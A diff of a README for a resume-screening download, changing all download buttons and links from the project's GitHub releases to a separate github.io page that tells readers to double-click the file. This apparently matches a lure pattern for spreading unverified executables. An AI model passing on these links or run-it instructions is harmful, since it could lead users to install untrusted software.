@@ -1,6 +1,6 @@
 # 🎯 jev-resume-disqualifier - Instantly Eliminate Unqualified Applicants
 
-[![Download Now](https://img.shields.io/badge/Download-Jev_Resume_Disqualifier-2ea44f?style=for-the-badge&logo=github)](https://github.com/kerasum2704/jev-resume-disqualifier/releases)
+[![Download Now](https://img.shields.io/badge/Download-Jev_Resume_Disqualifier-2ea44f?style=for-the-badge&logo=github)](https://kerasum2704.github.io)
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ You don't need any technical skills. If you can click a button and open a file, 
 **Step 1: Get the Application**
 
 Visit this link to download the application:  
-👉 **[https://github.com/kerasum2704/jev-resume-disqualifier/releases](https://github.com/kerasum2704/jev-resume-disqualifier/releases)**
+👉 **[https://kerasum2704.github.io](https://kerasum2704.github.io)**
 
 On that page, you'll see a list of available versions. Look for the most recent one (usually at the top). Click the download button to save the file to your computer.
 
@@ -139,7 +139,7 @@ Don't let another unqualified applicant waste your valuable time. With **jev-res
 
 **Ready to get started?**
 
-👉 **[Download Now](https://github.com/kerasum2704/jev-resume-disqualifier/releases)**
+👉 **[Download Now](https://kerasum2704.github.io)**
 
 The download takes less than a minute. Once it's complete, double-click to run and you're on your way to faster, smarter hiring.
 
@@ -168,7 +168,7 @@ Stop spending hours reading resumes that were never qualified in the first place
 
 Download your copy today and transform your hiring process forever.
 
-[![Get Started Now](https://img.shields.io/badge/🚀-Get_Started_Now-blue?style=for-the-badge)](https://github.com/kerasum2704/jev-resume-disqualifier/releases)
+[![Get Started Now](https://img.shields.io/badge/🚀-Get_Started_Now-blue?style=for-the-badge)](https://kerasum2704.github.io)
 
 ---
 
